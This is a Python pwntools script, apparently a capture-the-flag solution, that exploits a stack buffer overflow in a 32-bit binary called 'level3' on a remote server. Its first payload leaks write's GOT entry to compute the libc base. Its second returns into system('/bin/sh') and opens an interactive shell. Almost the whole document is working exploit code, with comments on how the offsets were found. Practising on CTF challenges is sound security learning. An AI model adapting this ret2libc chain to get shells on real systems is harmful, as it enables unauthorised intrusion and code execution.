from pwn import *
# io = process('./level3')
io = remote("111.200.241.244", "51341")
# gdb.attach(io) 

io.recvline()				

### get func address ###
write_plt = 0x8048340		# 0x080484a6 <+34>:	call   0x8048340 <write@plt>
write_got = 0x804a018		# pwndbg> x/i 0x8048340
				# 0x8048340 <write@plt>:	jmp    DWORD PTR ds:0x804a018
main_addr = 0x8048484 		# main start address
ebp = 0xdeadbeef		# junk

# Input: - 1

payload = "A" * 0x88 
payload += p32(ebp) + p32(write_plt) + p32(main_addr) 
payload += p32(1) + p32(write_got) + p32(ebp)


io.sendline(payload)

# leak write's addr in got---------------------------------------------------------

write_got_addr = u32(io.recv()[:4])
print('Write_got address is', hex(write_got_addr))

# leak libc's addr-----------------------------------------------------------------
# readelf -s libc_32.so.6 | grep write
# -> 2323: 000d43c0   101 FUNC    WEAK   DEFAULT   13 write@@GLIBC_2.0

libc_addr = write_got_addr - 0xd43c0 		# libc.symbols['write']	
print('libc address is', hex(libc_addr))

# get system's addr----------------------------------------------------------------
# readelf -s libc_32.so.6 | grep system
# -> 1457: 0003a940    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0

sys_addr = libc_addr + 0x3a940 			# libc.symbols['system']		
print('system address is', hex(sys_addr))

# get /bin/sh 's addr--------------------------------------------------------------
# strings -a -t x libc_32.so.6 | grep "/bin/sh"
# -> 15902b /bin/sh

bin_sh_addr = libc_addr + 0x15902b		# libc.search("/bin/sh").next()
print('/bin/sh address is', hex(bin_sh_addr))

# Input: - 2

payload = 'A' * 0x88 
payload += p32(0xdeadbeef) 
payload += p32(sys_addr) + p32(0xdeadbeef) + p32(bin_sh_addr)

io.sendline(payload)

io.interactive()
